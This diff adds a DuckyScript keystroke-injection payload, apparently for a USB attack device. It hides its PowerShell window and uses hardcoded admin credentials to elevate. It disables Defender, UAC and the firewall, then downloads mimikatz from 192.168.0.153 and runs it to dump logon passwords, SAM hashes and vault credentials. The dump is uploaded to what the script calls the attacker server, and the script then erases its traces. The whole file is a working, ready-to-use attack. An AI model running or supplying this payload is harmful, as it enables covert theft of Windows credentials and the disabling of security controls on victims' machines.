@@ -1,0 +1,112 @@
+REM |===Start PowerShell as admin===|
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 3000
+STRING uwe-pc\local_admin
+TAB
+DELAY 1000
+STRING Admin@123
+DELAY 100
+ALT y
+DELAY 2000
+
+REM |=== Obfuscate the command prompt ===|
+ALT SPACE
+DELAY 1000
+STRING m
+DELAY 500
+DOWNARROW
+REPEAT 100
+ENTER  
+DELAY 1000
+STRING mode con:cols=30 lines=1
+ENTER
+DELAY 50
+
+REM |===Disable Windows defender====|
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 50
+Set-MpPreference -EnableControlledFolderAccess Disabled
+ENTER
+DELAY 50
+
+REM |===Set Powershell EXE Policy====|
+STRING Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
+ENTER
+DELAY 50
+STRING y
+ENTER
+DELAY 200
+
+REM |===Disabling the UAC===|
+STRING Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
+ENTER
+DELAY 200
+
+REM |===Disabling the Firewall===|
+STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+ENTER
+DELAY 200
+
+REM |==== Create Dir for mimikatz download =====|
+STRING mkdir $home\Desktop\tmp
+ENTER
+DELAY 200
+STRING Set-MpPreference -ExclusionPath "$home\Desktop\tmp"
+ENTER
+DELAY 200
+
+REM |==== Download and Run Mimikatz ===|
+STRING cd $home\Desktop\tmp
+ENTER
+DELAY 1000
+STRING Invoke-WebRequest "http://192.168.0.153/files/mimikatz.exe" -OutFile "mimi.exe"
+ENTER
+DELAY 500
+STRING .\mimi.exe log version privilege::debug token::elevate lsadump::cache sekurlsa::msv sekurlsa::logonpasswords sekurlsa::ekeys vault::cred vault::list  lsadump::sam lsadump::secrets vault::cred vault::list answer exit
+ENTER
+DELAY 500
+
+
+REM |==== Upload Hash File to the attacker Server ===|
+STRING $wc = New-Object System.Net.WebClient
+ENTER
+DELAY 50
+STRING $resp = $wc.UploadFile('http://192.168.0.153/','C:\Users\local_admin\Desktop\tmp\mimikatz.log')
+ENTER
+DELAY 100
+
+STRING 
+
+REM |==== Clean Up Path ====|
+
+REM |===Disable Windows defender====|
+STRING Set-MpPreference -DisableRealtimeMonitoring $false
+ENTER
+DELAY 50
+STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+ENTER
+DELAY 200
+Set-MpPreference -EnableControlledFolderAccess Enabled
+ENTER
+DELAY 50
+
+REM |===Set Powershell EXE Policy====|
+STRING Set-ExecutionPolicy -ExecutionPolicy Default -Scope LocalMachine -Force
+ENTER
+DELAY 50
+
+REM |==== Clean Folder ===|
+STRING cd $home
+ENTER
+DELAY 50
+STRING Remove-Item $HOME\Desktop\tmp -Recurse
+ENTER
+STRING exit
+ENTER
+
+
